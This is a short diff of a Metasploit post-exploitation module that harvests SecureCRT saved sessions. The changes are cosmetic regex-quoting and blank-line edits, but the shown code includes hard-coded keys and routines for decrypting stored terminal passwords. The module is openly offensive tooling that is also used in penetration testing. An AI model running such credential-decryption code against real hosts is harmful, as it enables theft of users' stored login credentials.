@@ -95,9 +95,8 @@ class MetasploitModule < Msf::Post
         username = file[/"Username"=(?<username>[^\s]+)/, 'username']
       end
 
-      port = file[/#{protocol}\r\n\w:\"Port\"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s
-      port = file[/\[#{protocol}\] Port\"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s if port.nil?
-
+      port = file[/#{protocol}\r\n\w:"Port"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s
+      port = file[/\[#{protocol}\] Port"=(?<port>[0-9a-f]{8})/, 'port']&.to_i(16)&.to_s if port.nil?
 
       tbl << {
         file_name: item['name'],
@@ -113,6 +112,7 @@ class MetasploitModule < Msf::Post
 
   def securecrt_crypto(ciphertext)
     return nil if ciphertext.nil? || ciphertext.empty?
+
     key1 = "\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07"
     key2 = "\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7"
     ciphered_bytes = [ciphertext].pack('H*')
@@ -129,6 +129,7 @@ class MetasploitModule < Msf::Post
 
   def securecrt_crypto_v2(ciphertext)
     return nil if ciphertext.nil? || ciphertext.empty?
+
     iv = ("\x00" * 16)
     config_passphrase = datastore['PASSPHRASE'] || nil
     key = OpenSSL::Digest::SHA256.new(config_passphrase).digest
